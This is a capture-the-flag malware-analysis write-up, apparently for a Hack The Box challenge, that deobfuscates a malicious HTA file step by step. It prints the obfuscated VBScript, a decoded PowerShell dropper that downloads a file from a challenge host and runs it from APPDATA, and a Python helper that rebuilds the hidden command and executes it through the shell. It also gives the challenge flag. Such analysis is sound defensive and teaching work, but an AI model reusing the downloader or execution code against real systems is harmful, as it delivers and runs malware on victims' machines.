...
We were give wanted.hta. Contains many URL encode. Use cyberchef to decode.
![image](https://github.com/user-attachments/assets/fc9158e6-c73e-4811-b7ff-f56ddf2813d8)

Remove the spaces, can try to rename the function if you want.
![image](https://github.com/user-attachments/assets/3bb9e29c-af3a-439c-9eef-8f814ff0475d)
...
PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM="PowErShEll -Ex  BYPaSS -NOP -W 1 -C  dEVIcEcrEDEnTIAlDePlOYmENt.EXe;
...
OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.rUN
chR (34) & OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.eXpanDEnVIroNMENtSTRinGs(Chr(&H25) & ChrW(&H53) & Chr(&H79) & ChrW(&H73) & ChrW(&H54) & ChrW(&H65) & ChrW(&H6D) & Chr(&H52) & ChrW(&H4F) & Chr(&H6F) & ChrW(&H74) & ChrW(&H25)) & "\SYStEM32\WINdOwSpoweRSheLL\V1.0\PoWERshElL.ExE" & chr(34) & cHR (32) & Chr (34) &
PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM &CHr(34),0:
...
You can find base64 string

```
fRoMBASE64string(' [CHar]0X22 '' [cHar]0X22 ')
```
decode using cyberchef
```
$ea6c8mrT=Add-Type -meMBerDefinITIon'[DllImport("uRLmON.dlL",CharSet=CharSet.Unicode)]
public static extern IntPtr URLDownloadToFile(IntPtr PG,string Cfmr,string  aUvyVBRD,uint ffYlDol,IntPtr oFXrIh);' -nAME "SuxtPIBJxl" NamEsPAcE nIYp -PassThru;
$ea6c8mrT::URLDownloadToFile(0,"http://wanted.alive.htb/35/wanted.tIF","$eNv:APPDATA\wanted.vbs",0,0);STARt-sleeP(3);
stARt"$enV:APPDATA\wanted.vbs"
```
found intersting domain with file wanted.tIF 
http://wanted.alive.htb/35/wanted.tIF

spawn docker and add /35/wanted.tIF/35/wanted.tIF to download file. 

open wanted.tIF, there is one function that is interesting
![image](https://github.com/user-attachments/assets/2f763cb0-4f87-420e-a4b3-7a1d5a5902ab)
...
End If
```
Create python script to get the variable.

```python
import subprocess

# Function to replace substring
def replace_substring(descair, brita, chincharel):
    while brita in descair:
        descair = descair.replace(brita, chincharel)
        print(f"Updated descair: {descair}")
    return descair

# Sample encoded string (replace the actual encoded string as needed)
latifoliado = ("U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"
...
# Substring to remove and replace
parrana = "d2FudGVkCg"

# arran sample string
arran = "d2FudGVkCg  d2FudGVkCg $d2FudGVkCgCod2FudGVkCgdid2FudGVkCggod2FudGVkCg d2FudGVkCg" + latifoliado + "d2FudGVkCg$d2FudGVkCgOWd2FudGVkCgj"

print("Initial arran:", arran)

# Replace parrana from arran
arran = replace_substring(arran, parrana, "")

print("Modified arran:", arran)
...
# Replace parrana from sandareso
sandareso = replace_substring(sandareso, parrana, "")

print("sandareso:", sandareso)

# Combine arran with sandareso
sandareso += arran

# Execute the final command
print("Executing command:", sandareso)
subprocess.run(sandareso, shell=True)

```

```
Initial arran: d2FudGVkCg  d2FudGVkCg $d2FudGVkCgCod2FudGVkCgdid2FudGVkCggod2FudGVkCg $d2FudGVkCgOWd2FudGVkCgj
Updated descair:    $Codigo $OWj
Modified arran:    $Codigo $OWj
Updated descair: powrsell -command 
sandareso: powrsell -command 
Executing command: powrsell -command    $Codigo $OWj
```

Decode using cyberchef
![image](https://github.com/user-attachments/assets/c398d135-c0c6-42e6-9927-6f7e51a8205e)

Another domain http://wanted.alive.htb/cdba/_rp

Access through docker

![image](https://github.com/user-attachments/assets/25b9a015-39cd-49d0-a794-a4965b97fcc5)

## Flag
```
HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_501901be0bc3d8e0cf961f7a5b563c03}
```
